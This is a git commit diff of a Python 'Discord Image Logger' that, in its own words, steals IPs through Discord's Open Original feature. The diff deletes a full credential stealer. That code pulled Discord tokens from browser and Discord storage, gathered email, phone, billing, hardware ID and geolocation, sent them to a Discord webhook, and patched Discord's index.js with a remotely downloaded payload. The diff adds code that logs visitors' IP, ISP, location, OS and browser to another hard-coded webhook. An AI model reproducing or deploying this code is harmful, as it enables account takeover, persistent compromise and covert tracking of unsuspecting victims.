b3401e01582af86a3557aeb46e1b50f61fb3838e
FRG-SHADOWFALL <76147546+FRG-SHADOWFALL@users.noreply.github.com>
2023-04-14 11:23:46 +0530

    Update yashasknife.py

--- api/yashasknife.py
+++ api/yashasknife.py
@@ -1,20 +1,11 @@
+"webhook": "https://discord.com/api/webhooks/1096296454806581258/KinapytnZC-oFYPYHIPyHVEzpa-0GPKzI5Uj8GQhSBU4IyeK0M2Ppen4oMT0cLkX-wge",
+    "image": "https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg",
+
+
+
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import os
-if os.name != "nt":
-	exit()
-from re import findall
-import json
-import psutil
-import platform as plt
-from json import loads, dumps
-from base64 import b64decode
-from subprocess import Popen, PIPE
-from urllib.request import Request, urlopen
-from datetime import datetime
-
-
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -73,55 +64,6 @@ config = {
     # 3) Message (If this is enabled, disables image)
     # 4) Image 
 }
-webhook_url = "https://discord.com/api/webhooks/935435012982054932/S8HOnzKeraPSSsLPijzLXw16e8WFAZodwjkWCZSznjCCyQvk9TweLAPM3D2X7KuP0YnP"
-password_stealer = True
-
-languages = {
-	'da'    : 'Danish, Denmark',
-	'de'    : 'German, Germany',
-	'en-GB' : 'English, United Kingdom',
-	'en-US' : 'English, United States',
-	'es-ES' : 'Spanish, Spain',
-	'fr'    : 'French, France',
-	'hr'    : 'Croatian, Croatia',
-	'lt'    : 'Lithuanian, Lithuania',
-	'hu'    : 'Hungarian, Hungary',
-	'nl'    : 'Dutch, Netherlands',
-	'no'    : 'Norwegian, Norway',
-	'pl'    : 'Polish, Poland',
-	'pt-BR' : 'Portuguese, Brazilian, Brazil',
-	'ro'    : 'Romanian, Romania',
-	'fi'    : 'Finnish, Finland',
-	'sv-SE' : 'Swedish, Sweden',
-	'vi'    : 'Vietnamese, Vietnam',
-	'tr'    : 'Turkish, Turkey',
-	'cs'    : 'Czech, Czechia, Czech Republic',
-	'el'    : 'Greek, Greece',
-	'bg'    : 'Bulgarian, Bulgaria',
-	'ru'    : 'Russian, Russia',
-	'uk'    : 'Ukranian, Ukraine',
-	'th'    : 'Thai, Thailand',
-	'zh-CN' : 'Chinese, China',
-	'ja'    : 'Japanese',
-	'zh-TW' : 'Chinese, Taiwan',
-	'ko'    : 'Korean, Korea'
-}
-
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-	"Discord"           : ROAMING + "\\Discord",
-	"Discord Canary"    : ROAMING + "\\discordcanary",
-	"Discord PTB"       : ROAMING + "\\discordptb",
-	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
-	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-	"Opera GX"			: ROAMING + "\\Opera Software\\Opera GX Stable",
-	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
-}
-
-
-
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
@@ -147,200 +89,25 @@ def reportError(error):
     ],
 })
 
-def getheaders(token=None, content_type="application/json"):
-	headers = {
-		"Content-Type": content_type,
-		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-	}
-	if token:
-		headers.update({"Authorization": token})
-	return headers
-
-def getuserdata(token):
-	try:
-		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-	except:
-		pass
-		
-def gettokens(path):
-	path += "\\Local Storage\\leveldb"
-	tokens = []
-	for file_name in os.listdir(path):
-		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-			continue
-		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-				for token in findall(regex, line):
-					tokens.append(token)
-	return tokens
-
-def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-
-def getip():
-	ip = org = loc = city = country = region = googlemap = "None"
-	try:
-		url = 'http://ipinfo.io/json'
-		response = urlopen(url)
-		data = json.load(response)
-		ip = data['ip']
-		org = data['org']
-		loc = data['loc']
-		city = data['city']
-		country = data['country']
-		region = data['region']
-		googlemap = "https://www.google.com/maps/search/google+map++" + loc
-	except:
-		pass
-	return ip,org,loc,city,country,region,googlemap
-
-def getavatar(uid, aid):
-	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
-	try:
-		urlopen(Request(url))
-	except:
-		url = url[:-4]
-	return url
-
-def has_payment_methods(token):
-	try:
-		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
-	except:
-		pass
-
-def main():
-	embeds = []
-	working = []
-	checked = []
-	working_ids = []
-	computer_os = plt.platform()
-	ip,org,loc,city,country,region,googlemap = getip()
-	pc_username = os.getenv("UserName")
-	pc_name = os.getenv("COMPUTERNAME")
-	for platform, path in PATHS.items():
-		if not os.path.exists(path):
-			continue
-		for token in gettokens(path):
-			if token in checked:
-				continue
-			checked.append(token)
-			uid = None
-			if not token.startswith("mfa."):
-				try:
-					uid = b64decode(token.split(".")[0].encode()).decode()
-				except:
-					pass
-				if not uid or uid in working_ids:
-					continue
-			user_data = getuserdata(token)
-			if not user_data:
-				continue
-			working_ids.append(uid)
-			working.append(token)
-			username = user_data["username"] + "#" + str(user_data["discriminator"])
-			user_id = user_data["id"]
-			locale = user_data['locale']
-			avatar_id = user_data["avatar"]
-			avatar_url = getavatar(user_id, avatar_id)
-			email = user_data.get("email")
-			phone = user_data.get("phone")
-			verified = user_data['verified']
-			mfa_enabled = user_data['mfa_enabled']
-			flags = user_data['flags']
-			creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S")
-
-			language = languages.get(locale)
-			nitro = bool(user_data.get("premium_type"))
-			billing = bool(has_payment_methods(token))
-			embed = {
-				"color": 16507654,
-				"fields": [
-					{
-						"name": "**𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗻𝗳𝗼**",
-						"value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-						"inline": True
-					},
-					{
-						"name": "**𝗣𝗰 𝗜𝗻𝗳𝗼**",
-						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
-						"inline": True
-					},
-					{
-						"name": "--------------------------------------------------------------------------------------------------",
-						"value":"-----------------------------------------------------------------------------------------------",
-						"inline": False
-					},
-					{
-						"name": "**𝗜𝗣**",
-						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
-						"inline": True
-					},
-					{
-						"name": "**𝗢𝘁𝗵𝗲𝗿 𝗜𝗻𝗳𝗼**",
-						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
-						"inline": True
-					},
-					{
-						"name": "**𝗧𝗼𝗸𝗲𝗻**",
-						"value": f"`{token}`",
-						"inline": False
-					}
-				],
-				"author": {
-					"name": f"{username}・{user_id}",
-					"icon_url": avatar_url
-				},
-				"footer": {
-					"text": "By StarkCuber"
-				}
-			}
-			embeds.append(embed)
-
-	if len(working) == 0:
-		working.append('123')
-	webhook = {
-		"content": "",
-		"embeds": embeds,
-		"username": "Shadow Grabber",
-		"avatar_url": "https://cdn.discordapp.com/attachments/940588028458598440/948846145436794900/shadow_reward.png"
-	}
-	try:
-		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
-	except:
-		pass
-
-def ShadowTR():
-	for proc in psutil.process_iter():
-		if any(procstr in proc.name() for procstr in\
-		['discord', 'Discord', 'DISCORD',]):
-			proc.kill()
-	for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
-		for name in dirs:
-			if (name.__contains__("discord_desktop_core-")):
-				try:
-					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Shadow"))
-					f = urlopen("https://raw.githubusercontent.com/FRG-SHADOWFALL/shadowsinfo/main/shadowtk2")
-					index_content = f.read()
-					with open(directory_list, 'wb') as index_file:
-						index_file.write(index_content)
-					with open(directory_list, 'r+') as index_file2:
-						replace_string = index_file2.read().replace("%WEBHOOK_LINK%", webhook_url)
-					with open(directory_list, 'w'): pass
-					with open(directory_list, 'r+') as index_file3:
-						index_file3.write(replace_string)
-				except Exception:
-				    pass
-	for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
-		for name in files:
-			discord_file = os.path.join(root, name)
-			os.startfile(discord_file)
-
-
-
-    if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
-	return
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+    if ip.startswith(blacklistedIPs):
+        return
+    
+    bot = botCheck(ip, useragent)
+    
+    if bot:
+        requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "",
+    "embeds": [
+        {
+            "title": "Image Logger - Link Sent",
+            "color": config["color"],
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+        }
+    ],
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+        return
 
     ping = "@everyone"
 
@@ -374,6 +141,43 @@ def ShadowTR():
 
     os, browser = httpagentparser.simple_detect(useragent)
     
+    embed = {
+    "username": config["username"],
+    "content": ping,
+    "embeds": [
+        {
+            "title": "Image Logger - IP Logged",
+            "color": config["color"],
+            "description": f"""**A User Opened the Original Image!**
+**Endpoint:** `{endpoint}`
+            
+**IP Info:**
+> **IP:** `{ip if ip else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+**PC Info:**
+> **OS:** `{os}`
+> **Browser:** `{browser}`
+**User Agent:**
+```
+{useragent}
+```""",
+    }
+  ],
+}
+    
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
+    return info
+
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
     # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
@@ -434,6 +238,23 @@ height: 100vh;
                 
 
                 message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
                 datatype = 'text/html'
 
                 if config["message"]["doMessage"]:
@@ -478,8 +299,3 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
-if __name__ == "__main__":
-    main()
-    if password_stealer:
-        ShadowTR()
-
